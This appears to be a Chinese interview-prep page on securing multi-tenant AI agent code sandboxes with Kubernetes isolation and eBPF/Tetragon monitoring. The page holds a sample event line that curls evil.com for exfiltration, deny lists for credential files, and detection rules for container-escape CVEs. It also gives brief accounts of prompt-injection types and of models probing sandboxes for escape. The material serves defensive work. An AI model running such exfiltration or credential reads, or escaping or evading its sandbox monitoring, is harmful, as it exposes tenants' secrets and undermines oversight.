+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实时查看事件（调试用）</span></span><br><span class="line">kubectl <span class="built_in">exec</span> -n kube-system ds/tetragon -c tetragon -- \</span><br><span class="line">  tetra getevents -o compact</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出格式示例</span></span><br><span class="line">🔴 <span class="built_in">exit</span>    agent-tenant-a/agent-pod-xyz /usr/bin/curl https://evil.com/exfil</span><br><span class="line">🟡 connect agent-tenant-a/agent-pod-xyz 169.254.169.254:80</span><br><span class="line">🔴 open    agent-tenant-a/agent-pod-xyz /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>生产环境中事件通过 gRPC API → Fluentd/OTEL collector → Elasticsearch/Loki 存储 → Grafana 展示 + AlertManager 告警。</p>
+<p><strong>Step 5：关联 eBPF 事件到 Pod 身份</strong></p>
+<p>这是 K8s 环境下 eBPF 监控的关键步骤——eBPF 在内核层只能看到 cgroup ID 和 PID，需要映射到 K8s 的 Pod 名、Namespace、Labels：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">内核侧：</span><br><span class="line">  eBPF 程序调用 bpf_get_current_cgroup_id() → 得到 cgroup ID</span><br><span class="line"></span><br><span class="line">用户态：</span><br><span class="line">  Tetragon agent 启动时通过 K8s API watch Pod 事件</span><br><span class="line">  维护一个 cgroup ID → Pod 元数据的映射表：</span><br><span class="line">    cgroup_id_12345 → &#123;</span><br><span class="line">      name: &quot;agent-pod-xyz&quot;,</span><br><span class="line">      namespace: &quot;agent-tenant-a&quot;,</span><br><span class="line">      labels: &#123;&quot;tenant&quot;: &quot;acme&quot;, &quot;runtime&quot;: &quot;kata&quot;&#125;,</span><br><span class="line">      serviceAccount: &quot;agent-sa&quot;,</span><br><span class="line">      containerID: &quot;containerd:&#x2F;&#x2F;abc...&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  eBPF 事件到达用户态后，enrichment：</span><br><span class="line">    原始事件：&#123;cgroup_id: 12345, syscall: &quot;open&quot;, path: &quot;&#x2F;etc&#x2F;shadow&quot;&#125;</span><br><span class="line">    → 关联后：&#123;pod: &quot;agent-pod-xyz&quot;, namespace: &quot;agent-tenant-a&quot;,</span><br><span class="line">               tenant: &quot;acme&quot;, syscall: &quot;open&quot;, path: &quot;&#x2F;etc&#x2F;shadow&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键挑战：</strong></p>
+<ul>
+<li>Tetragon Pod 自身需要高权限——它是攻击者的高价值目标</li>
+<li>大规模集群中 eBPF 事件量巨大，必须在内核侧通过 selector 做过滤</li>
+<li>不同 Node 可能运行不同内核版本，eBPF 程序需要 CO-RE 支持</li>
+<li>如果使用 Kata/Firecracker，eBPF 程序需要加载到 guest 内核（不是 host 内核），部署方式不同</li>
+</ul>
+</blockquote>
+<h3 id="Q-K8s-多租户隔离方案？"><a href="#Q-K8s-多租户隔离方案？" class="headerlink" title="Q: K8s 多租户隔离方案？"></a>Q: K8s 多租户隔离方案？</h3><blockquote>
+<p>K8s 原生并非为强多租户设计（共享内核、共享 apiserver），需要额外加固：</p>
+<p><strong>软隔离 vs 强隔离：</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>软隔离（Namespace 级别）</th>
+<th>强隔离（VM/Node 级别）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>方式</td>
+<td>K8s Namespace + RBAC + NetworkPolicy</td>
+<td>Kata/Firecracker + 专用 Node</td>
+</tr>
+<tr>
+<td>内核</td>
+<td>共享 host 内核</td>
+<td>每个 Pod 独立内核</td>
+</tr>
+<tr>
+<td>安全等级</td>
+<td>中（内核漏洞可跨租户）</td>
+<td>高（VM 边界）</td>
+</tr>
+<tr>
+<td>适用场景</td>
+<td>互信的内部团队</td>
+<td><strong>AI Agent 多租户（不可信代码）</strong></td>
+</tr>
+<tr>
+<td>性能开销</td>
+<td>低</td>
+<td>中（VM 启动 ~125ms）</td>
+</tr>
+</tbody></table>
+<p><strong>Agent 多租户推荐方案：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">K8s Cluster</span><br><span class="line">├── Namespace: agent-tenant-a</span><br><span class="line">│   ├── Pod (RuntimeClass: kata) → Kata microVM → Container</span><br><span class="line">│   ├── NetworkPolicy: deny-all + allow egress to API only</span><br><span class="line">│   ├── ResourceQuota: cpu&#x3D;4, memory&#x3D;8Gi, pods&#x3D;10</span><br><span class="line">│   └── ServiceAccount: no RBAC bindings, no token mount</span><br><span class="line">│</span><br><span class="line">├── Namespace: agent-tenant-b  (同上)</span><br><span class="line">│</span><br><span class="line">├── Namespace: security-monitoring</span><br><span class="line">│   ├── Tetragon DaemonSet (eBPF agent)</span><br><span class="line">│   ├── Security Event Collector</span><br><span class="line">│   └── Alert Manager</span><br><span class="line">│</span><br><span class="line">└── Admission Controller (OPA&#x2F;Gatekeeper)</span><br><span class="line">    ├── 禁止 privileged containers (除 monitoring namespace)</span><br><span class="line">    ├── 禁止 hostPath&#x2F;hostNetwork&#x2F;hostPID</span><br><span class="line">    ├── 强制 RuntimeClass: kata</span><br><span class="line">    ├── 强制 automountServiceAccountToken: false</span><br><span class="line">    └── 强制 securityContext: runAsNonRoot, readOnlyRootFilesystem</span><br></pre></td></tr></table></figure>
+
+<p><strong>Cilium 在网络层的作用（替代 kube-proxy）：</strong></p>
+<ul>
+<li>基于 eBPF 做 Service 负载均衡（比 iptables 性能高）</li>
+<li>CiliumNetworkPolicy 支持 L7 策略（HTTP path/method 级别过滤）</li>
+<li>可以按 <strong>DNS 域名</strong>做出口过滤（而不是只能按 IP，DNS 域名更友好）</li>
+<li>透明加密（WireGuard/IPsec）保护 Pod 间通信</li>
+</ul>
+<p><strong>NetworkPolicy 示例（Agent Pod 出口白名单）：</strong></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">networking.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">NetworkPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">agent-egress-whitelist</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">agent-tenant-a</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">podSelector:</span> &#123;&#125;        <span class="comment"># 应用到该 namespace 所有 Pod</span></span><br><span class="line">  <span class="attr">policyTypes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Egress</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Ingress</span></span><br><span class="line">  <span class="attr">ingress:</span> []             <span class="comment"># 禁止所有入站</span></span><br><span class="line">  <span class="attr">egress:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span>                   <span class="comment"># 只允许连接 LLM API</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">ipBlock:</span></span><br><span class="line">        <span class="attr">cidr:</span> <span class="number">10.0</span><span class="number">.50</span><span class="number">.0</span><span class="string">/24</span>   <span class="comment"># 内部 LLM API 网段</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">443</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">to:</span>                   <span class="comment"># 允许 DNS 查询（CoreDNS）</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">namespaceSelector:</span></span><br><span class="line">        <span class="attr">matchLabels:</span></span><br><span class="line">          <span class="attr">kubernetes.io/metadata.name:</span> <span class="string">kube-system</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">53</span></span><br><span class="line">      <span class="attr">protocol:</span> <span class="string">UDP</span></span><br><span class="line">  <span class="comment"># 注意：没有列出 169.254.169.254，所以 metadata API 被隐式禁止</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="Q-K8s-Secret-管理安全？"><a href="#Q-K8s-Secret-管理安全？" class="headerlink" title="Q: K8s Secret 管理安全？"></a>Q: K8s Secret 管理安全？</h3><blockquote>
+<p>K8s Secret 默认只是 base64 编码（<strong>不是</strong>加密），安全风险很大：</p>
+<p><strong>风险全景：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Secret 在整个生命周期中的暴露点：</span><br><span class="line"></span><br><span class="line">1. etcd 中明文存储（除非开启 encryption at rest）</span><br><span class="line">   → 攻击者拿到 etcd 访问权 &#x3D; 读取所有 Secret</span><br><span class="line"></span><br><span class="line">2. 通过 K8s API 读取</span><br><span class="line">   → kubectl get secret -o yaml（取决于 RBAC）</span><br><span class="line">   → ServiceAccount token 泄漏后远程读取</span><br><span class="line"></span><br><span class="line">3. 挂载到 Pod 后是明文文件</span><br><span class="line">   → &#x2F;var&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token</span><br><span class="line">   → 容器内任何进程都能读</span><br><span class="line"></span><br><span class="line">4. 环境变量注入</span><br><span class="line">   → &#x2F;proc&#x2F;self&#x2F;environ 可以被读取</span><br><span class="line">   → 如果有 SYS_PTRACE 权限，可以读其他进程的 environ</span><br><span class="line"></span><br><span class="line">5. kubelet 缓存</span><br><span class="line">   → Node 上 &#x2F;var&#x2F;lib&#x2F;kubelet&#x2F;pods&#x2F;*&#x2F;volumes&#x2F;kubernetes.io~secret&#x2F;</span><br><span class="line">   → 容器逃逸到 host 后可以读取同 Node 所有 Pod 的 Secret</span><br></pre></td></tr></table></figure>
+
+<p><strong>安全实践：</strong></p>
+<ul>
+<li>开启 etcd encryption at rest（<code>--encryption-provider-config</code>）</li>
+<li>使用外部 Secret 管理：HashiCorp Vault + External Secrets Operator</li>
+<li>Agent Pod 禁止自动挂载 ServiceAccount token（<code>automountServiceAccountToken: false</code>）</li>
+<li>如果 Agent 需要 API 凭证（如 LLM API key），通过 CSI Secret Store 挂载，而不是 K8s Secret</li>
+<li>RBAC 严格限制 Secret 的 get/list 权限</li>
+<li>用 eBPF LSM 监控 <code>/var/run/secrets/</code> 和 <code>/proc/*/environ</code> 的访问</li>
+</ul>
+</blockquote>
+<h3 id="Q-GPU-隔离在多租户-Agent-环境中的安全问题？"><a href="#Q-GPU-隔离在多租户-Agent-环境中的安全问题？" class="headerlink" title="Q: GPU 隔离在多租户 Agent 环境中的安全问题？"></a>Q: GPU 隔离在多租户 Agent 环境中的安全问题？</h3><blockquote>
+<p><strong>GPU 共享的安全挑战：</strong></p>
+<ul>
+<li>GPU 显存没有像 CPU 内存那样的硬件级隔离（没有 MMU 级别的进程隔离）</li>
+<li>显存残留：上一个任务释放的显存可能被下一个任务读到</li>
+<li>NVIDIA Container Toolkit 本身也是攻击面——CVE-2025-23266（NVIDIAScape）允许通过容器逃逸到 host</li>
+</ul>
+<p><strong>隔离方案对比：</strong></p>
+<table>
+<thead>
+<tr>
+<th>方案</th>
+<th>原理</th>
+<th>隔离强度</th>
+<th>性能</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>MIG</strong></td>
+<td>A100/H100 硬件级 GPU 分区</td>
+<td>强（独立显存+计算单元）</td>
+<td>好</td>
+<td>多租户推理</td>
+</tr>
+<tr>
+<td><strong>MPS</strong></td>
+<td>软件级 CUDA context 共享</td>
+<td>弱（无安全隔离）</td>
+<td>最好</td>
+<td>受信任的内部任务</td>
+</tr>
+<tr>
+<td><strong>vGPU（GRID）</strong></td>
+<td>Hypervisor 虚拟化</td>
+<td>中</td>
+<td>中</td>
+<td>虚拟化环境</td>
+</tr>
+<tr>
+<td><strong>Time-slicing</strong></td>
+<td>时间片轮转</td>
+<td>无</td>
+<td>好</td>
+<td>开发/测试</td>
+</tr>
+<tr>
+<td><strong>不挂载 GPU</strong></td>
+<td>API 调用远程推理服务</td>
+<td>最强（无 GPU 攻击面）</td>
+<td>依赖网络</td>
+<td><strong>Agent Code Interpreter</strong></td>
+</tr>
+</tbody></table>
+<p><strong>Agent 场景建议：</strong></p>
+<ul>
+<li>Code Interpreter 通常<strong>不需要本地 GPU</strong>——让它通过 API 调用远程推理服务，消除 GPU 攻击面</li>
+<li>如果必须本地 GPU：优先 MIG 做硬件隔离，确保 NVIDIA Container Toolkit 及时更新</li>
+<li>在 Kata microVM 方案中，GPU passthrough 会给 guest 完全控制权——安全性不如 MIG/vGPU</li>
+</ul>
+</blockquote>
+<hr>
+<h2 id="七、技术问答：AI-Agent-安全"><a href="#七、技术问答：AI-Agent-安全" class="headerlink" title="七、技术问答：AI Agent 安全"></a>七、技术问答：AI Agent 安全</h2><h3 id="Q-如何用-eBPF-追踪-Code-Interpreter-容器内的行为？"><a href="#Q-如何用-eBPF-追踪-Code-Interpreter-容器内的行为？" class="headerlink" title="Q: 如何用 eBPF 追踪 Code Interpreter 容器内的行为？"></a>Q: 如何用 eBPF 追踪 Code Interpreter 容器内的行为？</h3><blockquote>
+<p>在 host 上以 DaemonSet 方式部署 eBPF agent，attach 到以下 hook 点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">进程监控：</span><br><span class="line">  tracepoint&#x2F;sched&#x2F;sched_process_exec  → execve</span><br><span class="line">  tracepoint&#x2F;sched&#x2F;sched_process_fork  → 进程创建</span><br><span class="line">  tracepoint&#x2F;sched&#x2F;sched_process_exit  → 进程退出</span><br><span class="line">  → 通过 bpf_get_current_cgroup_id() 关联到容器</span><br><span class="line"></span><br><span class="line">文件监控：</span><br><span class="line">  LSM: security_file_open &#x2F; security_inode_create &#x2F; security_inode_unlink</span><br><span class="line">  → 从 dentry 提取路径，检查是否在允许范围内</span><br><span class="line"></span><br><span class="line">网络监控：</span><br><span class="line">  LSM: security_socket_connect → 出站连接</span><br><span class="line">  kprobe: tcp_v4_connect → TCP 连接细节</span><br><span class="line">  → 记录目标 IP&#x2F;端口、DNS 查询内容，与白名单对比</span><br><span class="line"></span><br><span class="line">数据传输：ring buffer → 用户态 collector → 与 tool call 上下文关联</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键挑战：</strong> AI Agent 的行为不可预测——传统 workload 的 baseline 是稳定的，但 Agent 执行的代码完全取决于 LLM 推理输出。不能简单做 syscall profile 匹配，需要把系统事件和应用层上下文关联起来。</p>
+</blockquote>
+<h3 id="Q-如何定义-AI-Agent-的”正常行为”？"><a href="#Q-如何定义-AI-Agent-的”正常行为”？" class="headerlink" title="Q: 如何定义 AI Agent 的”正常行为”？"></a>Q: 如何定义 AI Agent 的”正常行为”？</h3><blockquote>
+<p>思路是<strong>分层 baseline</strong>：</p>
+<p><strong>静态层（确定性）：</strong></p>
+<ul>
+<li>可执行文件白名单：只允许 python3、node、bash 等预定义解释器</li>
+<li>文件路径白名单：只允许 <code>/workspace/</code>、<code>/tmp/</code>、Python 标准库路径</li>
+<li>网络端点白名单：只允许连接特定 API</li>
+<li>禁止列表：永远不应访问的文件（<code>/etc/shadow</code>、<code>~/.ssh/</code>、<code>/proc/1/root</code>）</li>
+</ul>
+<p><strong>动态层（统计性）：</strong></p>
+<ul>
+<li>资源消耗基线：单次 tool call 的平均 CPU/内存/IO/网络</li>
+<li>异常检测：突然产生 1000 个文件操作 或 大量 DNS 查询</li>
+</ul>
+<p><strong>上下文关联层（语义性）：</strong></p>
+<ul>
+<li>“数据分析”tool call 中 open csv 合理，connect 到外部 IP 可疑</li>
+<li>将 eBPF 遥测事件与应用层 tool call 日志通过时间戳 + 容器 ID + PID 关联</li>
+</ul>
+</blockquote>
+<h3 id="Q-Prompt-Injection-的分类？"><a href="#Q-Prompt-Injection-的分类？" class="headerlink" title="Q: Prompt Injection 的分类？"></a>Q: Prompt Injection 的分类？</h3><blockquote>
+<p><strong>Direct</strong>：用户直接输入恶意 prompt 覆盖系统指令，相对容易防。</p>
+<p><strong>Indirect</strong>：更危险。攻击者将恶意指令嵌入 Agent 会读取的外部数据中：</p>
+<ul>
+<li>网页中的隐藏文本、代码注释（CVE-2025-53773 Copilot）、文档/邮件、API 返回</li>
+</ul>
+<p><strong>Multi-Agent 传播</strong>：注入低权限 Agent 来间接控制高权限 Agent（ServiceNow Now Assist 2025 案例）。</p>
+<p><strong>对 Runtime Security 的启示：</strong> Prompt injection 是应用层问题，但后果体现在系统层。eBPF 监控是 prompt injection 的<strong>最后防线</strong>——即使应用层过滤失败，系统层策略仍然能拦住恶意行为。</p>
+</blockquote>
+<h3 id="Q-Tool-Use-中的安全风险？"><a href="#Q-Tool-Use-中的安全风险？" class="headerlink" title="Q: Tool Use 中的安全风险？"></a>Q: Tool Use 中的安全风险？</h3><blockquote>
+<ul>
+<li><strong>过度授权</strong>：Agent 被赋予不必要的工具能力，被劫持后攻击面倍增</li>
+<li><strong>参数注入</strong>：LLM 生成的 tool call 参数包含恶意内容（SQL 注入、命令注入）</li>
+<li><strong>链式调用提权</strong>：多步组合形成攻击链（读配置获取 API key → 调高权限服务 → 外泄数据）</li>
+<li><strong>信任传递</strong>：Agent A 信任 Agent B 输出，攻击者通过 A 注入影响 B</li>
+</ul>
+<p>防御原则是 Meta 的 <strong>“Agents Rule of Two”**：不受信任的输入永远不应直接控制特权操作。eBPF 在系统层面做 tool call 的</strong>效果审计**——不管 LLM 认为它在做什么，系统层看到的是真实 syscall。</p>
+</blockquote>
+<h3 id="Q-Code-Interpreter-沙箱可能被怎么攻破？"><a href="#Q-Code-Interpreter-沙箱可能被怎么攻破？" class="headerlink" title="Q: Code Interpreter 沙箱可能被怎么攻破？"></a>Q: Code Interpreter 沙箱可能被怎么攻破？</h3><blockquote>
+<ol>
+<li><strong>容器逃逸</strong>：runc/containerd CVE、内核漏洞提权、配置不当。SandboxEscapeBench（2026.3）论文已证明前沿模型会主动探测和尝试逃逸</li>
+<li><strong>网络外泄</strong>：HTTP/DNS 数据泄露、DNS 隧道、ICMP 隧道</li>
+<li><strong>文件系统越权</strong>：多租户共享存储卷时路径穿越、/proc /sys 信息泄漏</li>
+<li><strong>资源耗尽 DoS</strong>：fork bomb、内存耗尽</li>
+<li><strong>供应链攻击</strong>：<code>pip install</code> 恶意包（setup.py 执行任意代码）</li>
+<li><strong>持久化</strong>：容器复用时留后门。防御：每个 task 用 ephemeral 容器</li>
+</ol>
+</blockquote>
+<h3 id="Q-Agent-安全的未来趋势？"><a href="#Q-Agent-安全的未来趋势？" class="headerlink" title="Q: Agent 安全的未来趋势？"></a>Q: Agent 安全的未来趋势？</h3><blockquote>
+<p><strong>短期（1-2年）：</strong></p>
+<ul>
+<li>eBPF 成为 Agent Runtime 监控标配；microVM 成为 Code Interpreter 默认隔离方案</li>
+<li>OWASP Agentic AI Top 10 推动标准化；EU AI Act 2026.8 生效</li>
+</ul>
+<p><strong>中期（3-5年）：</strong></p>
+<ul>
+<li>专门的 “Agent Security Platform”（类似 CWPP，但针对 Agent 特殊性）</li>
+<li>eBPF + LLM 闭环：用 LLM 分析 eBPF 遥测做安全研判</li>
+<li>硬件辅助隔离：GPU TEE、Intel TDX / AMD SEV</li>
+</ul>
+<p><strong>核心观点：</strong> Agent 安全必须打通”应用层 + 系统层”。只懂 LLM 的人不知道内核攻击面，只懂内核的人不理解 prompt injection。这个岗位需要能连接两端的人。</p>
+</blockquote>
+<hr>
+<h2 id="八、场景设计题"><a href="#八、场景设计题" class="headerlink" title="八、场景设计题"></a>八、场景设计题</h2><h3 id="Q-设计一个多租户-Code-Interpreter-的运行时安全方案"><a href="#Q-设计一个多租户-Code-Interpreter-的运行时安全方案" class="headerlink" title="Q: 设计一个多租户 Code Interpreter 的运行时安全方案"></a>Q: 设计一个多租户 Code Interpreter 的运行时安全方案</h3><blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">用户请求 → API Gateway → Agent Orchestrator → Sandbox Manager</span><br><span class="line">                                                     │</span><br><span class="line">                                       ┌──────────────┼──────────────┐</span><br><span class="line">                                       ▼              ▼              ▼</span><br><span class="line">                                  [Tenant A]    [Tenant B]    [Tenant C]</span><br><span class="line">                                  Firecracker   Firecracker   Firecracker</span><br><span class="line">                                  microVM       microVM       microVM</span><br><span class="line">                                    │             │             │</span><br><span class="line">                                  Container    Container    Container</span><br><span class="line">                                  + Seccomp    + Seccomp    + Seccomp</span><br><span class="line">                                  + eBPF LSM   + eBPF LSM   + eBPF LSM</span><br><span class="line"></span><br><span class="line">Host:</span><br><span class="line">┌─────────────────────────────────────────────────────────┐</span><br><span class="line">│  eBPF Agent (DaemonSet)                                 │</span><br><span class="line">│  ├── tracepoint&#x2F;LSM hooks → ring buffer → collector     │</span><br><span class="line">│  └── Metrics → Prometheus&#x2F;OTEL                          │</span><br><span class="line">│  Security Pipeline: events → Kafka → Analyzer → Alert   │</span><br><span class="line">└─────────────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p><strong>第一层：强隔离</strong> — Firecracker microVM，独立内核，session 结束后销毁<br><strong>第二层：容器加固</strong> — 最小 rootfs + Seccomp 白名单 + drop capabilities + read-only rootfs + uid 1000<br><strong>第三层：eBPF 监控</strong> — 进程/文件/网络/权限变更，LSM 策略按 cgroup ID 区分租户<br><strong>第四层：上下文关联</strong> — eBPF 事件 + tool call 日志关联，规则引擎判定风险等级<br><strong>第五层：网络策略</strong> — eBPF 出口过滤 + DNS 白名单 + 内部 PyPI 镜像</p>
+</blockquote>
+<h3 id="Q-（追问）具体配什么规则，能发现什么风险？"><a href="#Q-（追问）具体配什么规则，能发现什么风险？" class="headerlink" title="Q:（追问）具体配什么规则，能发现什么风险？"></a>Q:（追问）具体配什么规则，能发现什么风险？</h3><blockquote>
+<p>按风险场景逐个拆解，每条规则说明 <strong>hook 点 → 检测逻辑 → 能发现什么 → 处置动作</strong>：</p>
+<h4 id="一、容器逃逸-提权类"><a href="#一、容器逃逸-提权类" class="headerlink" title="一、容器逃逸 / 提权类"></a>一、容器逃逸 / 提权类</h4><table>
+<thead>
+<tr>
+<th>#</th>
+<th>eBPF hook 点</th>
+<th>检测逻辑</th>
+<th>发现的风险</th>
+<th>处置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>LSM <code>security_file_open</code></td>
+<td>打开 <code>/proc/self/exe</code> 且 flags 含 O_PATH</td>
+<td>CVE-2019-5736 runc 覆写攻击的前置动作</td>
+<td><strong>阻断 + kill</strong></td>
+</tr>
+<tr>
+<td>2</td>
+<td>LSM <code>security_file_open</code></td>
+<td>打开 <code>/proc/self/fd/[0-9]+</code> 且路径中含 <code>/../</code></td>
+<td>CVE-2024-21626 fd 泄漏逃逸（WORKDIR 利用）</td>
+<td><strong>阻断 + kill</strong></td>
+</tr>
+<tr>
+<td>3</td>
+<td>LSM <code>security_file_open</code></td>
+<td>写入 <code>/sys/fs/cgroup/*/release_agent</code></td>
+<td>CVE-2022-0492 cgroup 逃逸</td>
+<td><strong>阻断 + kill</strong></td>
+</tr>
+<tr>
+<td>4</td>
+<td>tracepoint <code>sys_enter_mount</code> / <code>sys_enter_pivot_root</code></td>
+<td>Agent 容器中任何 mount/pivot_root 调用</td>
+<td>尝试挂载 host 文件系统</td>
+<td><strong>Seccomp 层已阻断</strong>，eBPF 层记录告警</td>
+</tr>
+<tr>
+<td>5</td>
+<td>LSM <code>security_capable</code></td>
+<td>检查是否尝试获取 <code>CAP_SYS_ADMIN</code>/<code>CAP_SYS_PTRACE</code></td>
+<td>提权尝试</td>
+<td>阻断 + 告警</td>
+</tr>
+<tr>
+<td>6</td>
+<td>tracepoint <code>sys_enter_ptrace</code></td>
+<td>Agent 容器内任何 ptrace 调用</td>
+<td>进程注入 / 调试其他进程</td>
+<td><strong>Seccomp 层已阻断</strong>，eBPF 层记录</td>
+</tr>
+<tr>
+<td>7</td>
+<td>kprobe <code>commit_creds</code></td>
+<td>监控 uid/gid 从非零变为零</td>
+<td>内核漏洞提权成功</td>
+<td><strong>Critical 告警 + 立即销毁 VM</strong></td>
+</tr>
+<tr>
+<td>8</td>
+<td>LSM <code>security_file_open</code></td>
+<td>打开 <code>/var/run/docker.sock</code> 或 containerd socket</td>
+<td>容器运行时 socket 访问（配置不当时才可能）</td>
+<td>阻断 + 告警</td>
+</tr>
+</tbody></table>
+<h4 id="二、敏感文件访问类"><a href="#二、敏感文件访问类" class="headerlink" title="二、敏感文件访问类"></a>二、敏感文件访问类</h4><table>
+<thead>
+<tr>
+<th>#</th>
+<th>eBPF hook 点</th>
+<th>检测逻辑</th>
+<th>发现的风险</th>
+<th>处置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>9</td>
+<td>LSM <code>security_file_open</code></td>
+<td>路径匹配黑名单：<code>/etc/shadow</code>, <code>/etc/passwd</code>, <code>/etc/sudoers</code></td>
+<td>凭证窃取</td>
+<td>阻断</td>
+</tr>
+<tr>
+<td>10</td>
+<td>LSM <code>security_file_open</code></td>
+<td>路径匹配：<code>~/.ssh/*</code>, <code>~/.gnupg/*</code>, <code>~/.aws/*</code></td>
+<td>SSH 密钥 / 云凭证窃取</td>
+<td>阻断</td>
+</tr>
+<tr>
+<td>11</td>
+<td>LSM <code>security_file_open</code></td>
+<td>路径匹配：<code>/proc/1/*</code>（host init 进程的信息）</td>
+<td>host 信息侦察</td>
+<td>阻断</td>
+</tr>
+<tr>
+<td>12</td>
+<td>LSM <code>security_file_open</code></td>
+<td>路径匹配：<code>/var/run/secrets/kubernetes.io/*</code></td>
+<td>K8s ServiceAccount token 窃取</td>
+<td>阻断（配合 <code>automountServiceAccountToken: false</code>）</td>
+</tr>
+<tr>
+<td>13</td>
+<td>LSM <code>security_file_open</code></td>
+<td>路径匹配：<code>/proc/*/environ</code></td>
+<td>环境变量中的 API key / Secret 泄漏</td>
+<td>阻断（仅允许读自身进程的）</td>
+</tr>
+<tr>
+<td>14</td>
+<td>LSM <code>security_file_open</code></td>
+<td>路径不在白名单（<code>/workspace/</code>, <code>/tmp/</code>, Python 标准库路径）中</td>
+<td>未授权文件访问</td>
+<td>记录 + 频率超阈值则告警</td>
+</tr>
+<tr>
+<td>15</td>
+<td>LSM <code>security_inode_unlink</code> / <code>security_inode_rename</code></td>
+<td>删除或重命名 <code>/workspace</code> 外的文件</td>
+<td>破坏性操作</td>
+<td>阻断</td>
+</tr>
+</tbody></table>
+<h4 id="三、异常网络行为类"><a href="#三、异常网络行为类" class="headerlink" title="三、异常网络行为类"></a>三、异常网络行为类</h4><table>
+<thead>
+<tr>
+<th>#</th>
+<th>eBPF hook 点</th>
+<th>检测逻辑</th>
+<th>发现的风险</th>
+<th>处置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>16</td>
+<td>LSM <code>security_socket_connect</code></td>
+<td>目标 IP:port 不在白名单中</td>
